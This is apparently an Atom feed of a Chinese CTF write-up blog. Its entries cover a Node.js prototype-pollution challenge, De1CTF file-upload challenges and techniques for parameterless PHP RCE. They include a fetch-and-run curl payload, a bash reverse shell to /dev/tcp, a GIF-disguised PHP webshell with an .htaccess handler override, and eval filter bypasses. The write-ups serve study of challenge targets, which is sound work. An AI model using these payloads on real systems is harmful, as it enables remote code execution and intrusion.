&#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><p>咋一看<code>/status</code>中有命令执行，开头遇到了不认识的库。看到114师傅说的一点很有用（114师傅太强了！！），</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看见奇奇怪怪得库，先谷歌搜索 库名+vuln 除非他出0day题</span><br></pre></td></tr></table></figure><p>搜索之后发现undefsafe库存在原型链污染<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">参考链接</a></p><p>关键代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure><p>找了一遍之后在<code>/edit_note</code>中找类似的地方，id可控</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>在<code>edit_note</code>提交数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__.author&amp;author&#x3D;curl%20http:&#x2F;&#x2F;ip:5555&#x2F;shell|bash&amp;raw&#x3D;1</span><br></pre></td></tr></table></figure><p>shell中文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;5556 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>监听端口</p><p>然后在<code>/status</code>触发即可拿shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app@0a80d876cfe5:&#x2F;app$ cat &#x2F;flag</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">flag&#123;0251b48c-6b03-43f7-a799-3e99a77a2c8a&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;青龙组-filejava&quot;&gt;&lt;a href=&quot;#青龙组-filejava&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="刷题" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="比赛过程" scheme="https://sunny250.github.io/tags/%E6%AF%94%E8%B5%9B%E8%BF%87%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>De1ctf记录</title>
    <link href="https://sunny250.github.io/2020/05/02/De1ctf%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/05/02/De1ctf%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-02T02:55:23.000Z</published>
    <updated>2020-05-02T02:55:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a><strong>check in</strong></h2><p>打开链接是一个文件上传页面，抓包发现服务器是php5.4.16版本。上传一句话木马提示文件类型错误。后缀名不能是php，phtml,php2等之类的。还有MIME过滤，还对内容进行了过滤,不能包含一下字符</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</span><br></pre></td></tr></table></figure><p>修改文件名为1.gif，MIME为image/gif</p><p>过滤了ph。不能使用&lt;?php标签。php版本为5.4.16，支持使用php短标签</p><p>上传.htaccess，其中有过滤，使用<code>\</code>换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;1.gif</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?&#x3D;</span><br><span class="line">eval($_POST[cmd]);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .gif</span><br></pre></td></tr></table></figure><p>然后蚁剑连接，flag在更目录下。</p><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>打开题目给了源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox &#x3D; &quot;uploads&#x2F;&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if($_POST[&quot;submit&quot;])&#123;</span><br><span class="line">    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check())&#123;</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">            die($_FILES[&quot;file&quot;][&quot;error&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $filename&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);</span><br><span class="line">            echo &quot;save in:&quot; . $sandbox.&quot;&#x2F;&quot; . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Not Allow!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts &#x3D; array(&quot;php&quot;);</span><br><span class="line">    $ext &#x3D; explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    $exts &#x3D; trim(end($ext));</span><br><span class="line">    $file_content &#x3D; file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"></span><br><span class="line">    if(!preg_match(&#39;&#x2F;[a-z0-9;~^&#96;&amp;|]&#x2F;is&#39;,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(&#39;&#x2F;\.\.&#x2F;&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) &#123;</span><br><span class="line">          return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;upload&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>抓包查看是php7.2</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;check-in&quot;&gt;&lt;a href=&quot;#check-in&quot; class=&quot;headerlink&quot; title=&quot;check in&quot;&gt;&lt;/a&gt;&lt;strong&gt;check in&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;打开链接是一个文件上传页面，抓包发现服务器是php5.4.16版本。上传一句话木马提示文件类型错误。后缀名不能是php，phtml,php2等之类的。还有MIME过滤，还对内容进行了过滤,不能包含一下字符&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="De1CTF2020" scheme="https://sunny250.github.io/tags/De1CTF2020/"/>
    
  </entry>
  
  <entry>
    <title>无参数RCE的研究</title>
    <link href="https://sunny250.github.io/2020/04/30/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <id>https://sunny250.github.io/2020/04/30/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%9A%84%E7%A0%94%E7%A9%B6/</id>
    <published>2020-04-30T14:49:16.000Z</published>
    <updated>2020-04-30T14:49:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在写一道简单的web题目时候遇到一个奇怪的正则表达式，在此记录一下</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;[^\W]+\((?R)?\)&#x2F;</span><br></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>(?R)是递归匹配整个正则表达式，整个正则能匹配a(b(c(d()))),a(),a(b())这样的表达式，如果里面包含参赛就不能匹配到。</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'cmd'</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入参数phpinfo()；成功执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;No_Pram_Rec.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/pic/151.png" alt=""></p><p>传入参数scandir(“.”);没有显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;No_Pram_Rec.php?cmd&#x3D;scandir(&quot;.&quot;);</span><br></pre></td></tr></table></figure><p><img src="/pic/152.png" alt=""></p><p>也就是可以无限套函数，但是函数必须没有参数</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>在skysec师傅的博客里面介绍了几种利用手法。</p><h3 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1. getenv()"></a>1. getenv()</h3><p>getenv()获取的结果是数组，如何获取特定的数组元素是个问题。</p><p>可以使用array_rand() </p><blockquote><p>从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。 它使用了伪随机数产生算法，所以不适合密码学场景。</p><p>如果只取出一个，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。 取出数量如果超过 array 的长度，就会导致 <strong><code>E_WARNING</code></strong> 错误，并返回 NULL。</p></blockquote><p>一般想要的内容都是数组的值，不是数组的键名。</p><p>此时可以使用</p><p>array_flip()</p><blockquote><p>交换数组的键名和值</p></blockquote><p>相关的数组操作函数</p><ul><li><p>array_pop() 取最后一个数组</p></li><li><p>Array_values() 返回数组所有值组成的数组（键名是0，1，2，3）</p></li><li><p>array_reverse() 将数组逆序</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> – 将内部指针指向数组中的最后一个元素，并输出键值 （参考来自颖奇师傅博客）</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> – 将内部指针指向数组中的下一个元素，并输出键值</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> – 将内部指针指向数组中的上一个元素，并输出键值</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> – 将内部指针指向数组中的第一个元素，并输出键值</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> – 返回当前元素的键名和键值，并将内部指针向前移动</p></li></ul><h3 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h3><table><thead><tr><th align="left">版本</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">5.5.7</td><td align="left">此函数可用于 CLI server。</td></tr><tr><td align="left">5.4.0</td><td align="left">此函数可用于 FastCGI。 此前仅在PHP以 Apache 模块方式运行时支持。</td></tr><tr><td align="left">4.3.3</td><td align="left">从 PHP 4.3.3 起，也可在 Netscape/iPlanet/SunONE Web 服务器的 <a href="https://www.php.net/manual/zh/book.nsapi.php" target="_blank" rel="noopener">NSAPI 服务器模块</a>使用此函数。</td></tr><tr><td align="left">4.3.0</td><td align="left">被改名而成为 <a href="https://www.php.net/manual/zh/function.apache-request-headers.php" target="_blank" rel="noopener">apache_request_headers()</a> 的别名。因为此函数仅适用于 Apache 。</td></tr></tbody></table><p>此函数会返回httpheader头部形成一个数组</p><p>在此时可以使用自定义头部。达到rce</p><p><img src="/pic/153.png" alt=""></p><h3 id="3-get-defined-vars"><a href="#3-get-defined-vars" class="headerlink" title="3. get_defined_vars()"></a>3. get_defined_vars()</h3><p>由于部分版本的php只能在apache上运行getallheaders()才有效果。所以当getallheaders()失效时，可以采取本函数。</p><p><img src="/pic/155.png" alt=""></p><p>能返回<code>_GET</code>、<code>_POST</code>、<code>_COOKIE</code>、<code>_FILES</code>数组</p><p>选取<code>_GET</code>进行RCE</p><p><img src="/pic/156.png" alt=""></p><p>尝试<code>_FILES</code>数组（<code>_POST</code>、<code>_COOKIE</code>也是同样的用法）</p><p>通过文件名进行RCE（也可以使用MIME）</p><p>空格会被截断，所以需要进行编码，此处采用base64编码</p><p><img src="/pic/157.png" alt=""></p><h3 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4. session_id()"></a>4. session_id()</h3><p>这里是使用<code>_COOKIE</code>数组，除了直接利用get_defined_vars()，还能利用session_id()</p><blockquote><ul><li><a href="https://www.php.net/manual/zh/function.session-get-cookie-params.php" target="_blank" rel="noopener">session_get_cookie_params</a> — 获取会话 cookie 参数</li><li><a href="https://www.php.net/manual/zh/function.session-id.php" target="_blank" rel="noopener">session_id</a> — 获取/设置当前会话 ID</li><li><a href="https://www.php.net/manual/zh/function.session-name.php" target="_blank" rel="noopener">session_name</a> — 读取/设置会话名称</li><li><a href="https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">session_start</a> — 启动新会话或者重用现有会话</li></ul></blockquote><p>经过测试发现PHPSESSID允许字母和数字出现</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;在写一道简单的web题目时候遇到一个奇怪的正则表达式，在此记录一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常积累" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/"/>
    
    
      <category term="无参数Rec" scheme="https://sunny250.github.io/tags/%E6%97%A0%E5%8F%82%E6%95%B0Rec/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF2019-web</title>
    <link href="https://sunny250.github.io/2020/04/26/GXYCTF2019-web/"/>
    <id>https://sunny250.github.io/2020/04/26/GXYCTF2019-web/</id>
    <published>2020-04-26T07:52:11.000Z</published>
    <updated>2020-04-26T07:52:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><p>扫描目录发现git泄露</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;flag.php (CODE:200|SIZE:0)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;index (CODE:200|SIZE:137)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;config (CODE:200|SIZE:92)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F; (CODE:403|SIZE:571)</span><br></pre></td></tr></table></figure><p>使用githack复原代码得到</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span 